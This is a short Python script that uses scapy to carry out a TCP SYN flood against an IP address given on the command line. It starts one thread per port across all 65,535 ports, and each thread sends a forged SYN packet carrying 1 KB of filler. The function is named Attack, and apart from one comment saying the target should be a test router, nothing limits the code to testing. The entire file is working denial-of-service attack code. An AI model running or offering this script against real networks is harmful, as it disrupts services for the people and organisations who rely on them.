from scapy.all import IP, TCP, Raw, RandShort, send
import sys
import threading

sys.dont_write_bytecode = True

# target IP address (should be a testing router/firewall)
target_ip = sys.argv[1]

# iterate over a range of ports to detect and target all active ports
def Attack(target_port):
        # forge IP packet with target IP as the destination IP address
        ip = IP(dst=target_ip)

        # forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

        # add some flooding data (1KB in this case, don't increase it too much,
        # otherwise, it won't work.)
        raw = Raw(b"X"*1024)

        # stack up the layers
        p = ip / tcp / raw

        # send the constructed packet
        send(p, verbose=0)

        # Print the port number after sending the packet
        print(f"Packet sent to port {target_port}")

for target_port in range(1, 65536):
    threading.Thread(target=Attack, args=(target_port,)).start()

print(f"Syn attack completed on {target_ip}.")
